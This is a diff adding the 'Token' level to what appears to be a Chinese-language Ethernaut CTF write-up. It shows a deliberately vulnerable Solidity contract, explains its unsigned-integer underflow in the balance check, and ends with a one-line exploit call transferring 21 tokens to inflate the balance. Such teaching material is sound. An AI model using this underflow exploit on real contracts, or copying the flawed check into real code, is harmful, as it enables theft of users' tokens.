@@ -230,3 +230,48 @@ contract Attack {
     }
 }
 ```
+
+# Token
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract Token {
+    mapping(address => uint256) balances;
+    uint256 public totalSupply;
+
+    constructor(uint256 _initialSupply) public {
+        balances[msg.sender] = totalSupply = _initialSupply;
+    }
+
+    function transfer(address _to, uint256 _value) public returns (bool) {
+        require(balances[msg.sender] - _value >= 0);
+        balances[msg.sender] -= _value;
+        balances[_to] += _value;
+        return true;
+    }
+
+    function balanceOf(address _owner) public view returns (uint256 balance) {
+        return balances[_owner];
+    }
+}
+```
+需求：你最开始有 20 个 token, 如果你通过某种方法可以增加你手中的 token 数量，你就可以通过这一关，当然越多越好
+代码分析：
+```solidity
+mapping(address => uint256) balances;
+
+function transfer(address _to, uint256 _value) public returns (bool) {
+    require(balances[msg.sender] - _value >= 0); // 关键漏洞代码：无符号数减法可能会溢出变成一个极大数
+    balances[msg.sender] -= _value;
+    balances[_to] += _value;
+    return true;
+}
+```
+- 在 Solidity 0.8.0 之前，如果进行减法运算的结果小于零，实际上会导致数值从一个非常大的数字开始，而不是抛出错误。
+- 攻击步骤：调用 transfer 函数，尝试转账比初始余额更多的 token（如 _value 为 21），这将导致整数下溢。
+
+
+```solidity
+await contract.transfer(contract.address,21)
+```
